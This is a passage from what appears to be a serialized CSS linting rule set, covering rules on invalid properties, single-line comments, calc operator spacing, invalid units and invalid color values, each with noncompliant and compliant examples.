  <li> <a href="https://www.securecoding.cert.org/confluence/x/hYClBg">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>Z
CODE_SMELL
¥
	css:S4654¶
cssS4654CSS properties should be valid"BLOCKER*css:‰<p>The W3C specifications define the valid CSS properties. Only the official and browser-specific properties should be used to get the expected impact
in the final rendering.</p>
<p>This rule ignores:</p>
<p>- <code>$sass</code>, <code>@less</code>, and <code>var(--custom-property)</code> variable syntaxes.</p>
<p>- vendor-prefixed properties (e.g., <code>-moz-align-self</code>, <code>-webkit-align-self</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
a {
  colour: blue; /* Noncompliant; colour is not part of the specifications */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
  color: blue;
}
</pre>ZBUG
Ø
	css:S4668°
cssS4668-Single line comment syntax should not be used"BLOCKER*css:–<p>The W3C specifications say comments should be defined using <code>/* ... */</code>. The use of <code>//</code> is not supported on all browsers and
can lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// some comment
a { color: pink; }
</pre>
<h2>Compliant Solution</h2>
<pre>
/* some comment */
a { color: pink; }
</pre>
<h2>Exceptions</h2>
<p>This rule ignores single line comments in <code>less</code> and <code>scss</code> files.</p>ZBUG
‡
	css:S4650“
cssS4650*"calc" operands should be correctly spaced"BLOCKER*css:Ñ<p><code>calc</code> is a CSS3 function that provides the possibility to do simple math in CSS (add, subtract, divide, multiply). Without spaces
around operators, <code>calc</code> will have no effect.</p>
<p>More precisely, before an operator, there must be a single whitespace or a newline plus indentation. After an operator, there must be a single
whitespace or a newline.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#div1 {
    position: absolute;
    width: calc(100%- 100px); /* Noncompliant; no space after the % sign */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#div1 {
    position: absolute;
    width: calc(100% - 100px);
}
</pre>ZBUG
†
	css:S4653í
cssS4653Units should be valid"BLOCKER*css:Ÿ<p>The W3C specifications define the <code>units</code> that can be used with lengths. A unit that is not part of the list of supported ones is likely
to be a typo and will be seen as a UI bug by the user.</p>
<p>This rule raises an issue each time a unit is not officially supported.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a {
  width: 10pixels; /* Noncompliant; "pixels" is not a valid unit */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
  width: 10px;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/TR/css3-values/#lengths">CSS Specification</a> - Distance units </li>
</ul>ZBUG
®
	css:S4647ö
cssS4647!Color definitions should be valid"BLOCKER*css:’<p>An invalid color definition will by default be interpreted as black, which is likely to have unintended impacts on the expected look and feel of
the website.</p>
<p>This rule raises an issue when a color definition (<code>color</code>, <code>background-color</code>) is not valid. The color definition is
considered valid when it is made of hexadecimal characters:</p>
<p>- longhand: 6 or 8 characters (when alpha is defined)</p>
<p>- shorthand variant: 3 or 4 characters (when alpha is defined)</p>
<h2>Noncompliant Code Example</h2>
<pre>
a {
 color: #3c; /* Noncompliant; shorthand should be made of 3 characters */
}
div {
  background-color: #3cb371a; /* Noncompliant; alpha should have 2 characters */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
 color: #3cc;
}
div {
  background-color: #3cb371ac;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/color_value">Mozilla Web Technology for Developers</a> - CSS Color </li>
</ul>ZBUG